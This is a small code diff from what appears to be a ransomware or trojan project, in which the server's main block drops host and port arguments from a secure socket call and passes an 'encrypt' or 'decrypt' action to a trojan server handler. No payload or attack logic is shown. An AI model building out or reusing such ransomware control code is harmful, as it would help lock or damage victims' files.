@@ -139,6 +139,6 @@ if __name__ == "__main__":
     KEY = "D:\python_programmers_clab\TROJAN_RANSOMEWARE/key.pem"
     action = "decrypt"  # enter "encrypt" or "decrypt" manually
 
-    conn = SecureSocketServer(HOST, PORT, CERT, KEY).accept_client()
+    conn = SecureSocketServer(CERT, KEY).accept_client()
     with conn:
         TrojanServer(action, conn).handle_client()
